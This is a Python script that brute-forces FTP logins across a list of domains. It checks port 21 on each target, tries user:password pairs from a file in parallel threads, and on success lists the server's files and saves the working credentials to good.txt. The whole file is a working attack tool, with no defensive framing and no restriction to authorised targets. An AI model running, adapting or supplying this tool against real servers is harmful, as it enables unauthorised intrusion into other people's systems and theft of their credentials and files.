import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
from colorama import Fore, Style, init
from ftplib import FTP
import os

init(autoreset=True)

for filename in ['domains.txt', 'good.txt']:
    if not os.path.exists(filename):
        open(filename, 'w').close()
        
logins_file = "logins.txt"
good_file = "good.txt"
bad_file = "bad.txt"
domains_file = "domains.txt"
max_threads = 10

stop_event = threading.Event()
lock = threading.Lock()

def try_login(server, port, user, password):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((server, port))
        sock.recv(1024)
        sock.sendall(f"USER {user}\r\n".encode())
        sock.recv(1024) 

        sock.sendall(f"PASS {password}\r\n".encode())
        response = sock.recv(1024).decode()

        if "230" in response:
            ftp = FTP(server)
            ftp.login(user=user, passwd=password)
            files = ftp.nlst()
            print("Dir list:")
            if files:  
                print(", ".join(files))  
                return (user, password, files) 

    except ConnectionResetError:
        return None
    except socket.gaierror as e:
        if e.errno == 11001:
            return None
        else:
            return None
    except socket.timeout:
        return None  
    except Exception as e:
        return None
    finally:
        sock.close()

def remove_domain(domain):
    with lock:
        with open(domains_file, 'r') as f:
            lines = f.readlines()
        with open(domains_file, 'w') as f:
            for line in lines:
                if line.strip() != domain:
                    f.write(line)

def check_port_open(domain, port=21):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((domain, port))
            return True
    except (ConnectionRefusedError, OSError) as e:
 #       print(f"Error: {e}") 
        return False
        
with open(logins_file, 'r') as f:
    login_pairs = [line.strip() for line in f.readlines()]

with open(domains_file, 'r') as f:
    domains = [line.strip() for line in f.readlines()]

def is_domain_good(domain):
    with open(good_file, 'r') as good:
        good_domains = [line.split(' - ')[0] for line in good.readlines()]
    return domain in good_domains
    
def process_logins(domain):
    if not check_port_open(domain):
#        print(f"\nPort 21 closed for {Fore.RED}{domain}{Style.RESET_ALL}.")
        remove_domain(domain)  
        return []

    remove_domain(domain)
    if is_domain_good(domain):
        return []

    successful_logins = []

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {
            executor.submit(try_login, domain, 21, *login_pair.split(':')): login_pair
            for login_pair in login_pairs
        }

        for future in as_completed(futures):
            login_pair = futures[future]
            user, password = login_pair.split(':')
            output = f"\rDomain: {Fore.CYAN}{domain}{Style.RESET_ALL}, login: {Fore.GREEN}{user}{Style.RESET_ALL}, password: {Fore.RED}{password}{Style.RESET_ALL}"
            print(output, end='                                ', flush=True)

            result = future.result()
            if result:
                user, password, files = result  
                successful_logins.append((user, password, files))  

    if successful_logins:
        with lock:
            with open(good_file, 'a', encoding='utf-8') as good:  
                for user, password, files in successful_logins:
                    good.write(f"{domain} - {user}:{password} | Files: {', '.join(files)}\n")

    else:
        pass

    return successful_logins

for domain in domains:
    found_logins = process_logins(domain)
    if found_logins:
        print(f"\nFinished for {Fore.CYAN}{domain}{Style.RESET_ALL}. Logpasses:")
        for user, password, files in found_logins:
            print(f" - {Fore.GREEN}{user}:{password} | Files: {', '.join(files)}{Style.RESET_ALL}")
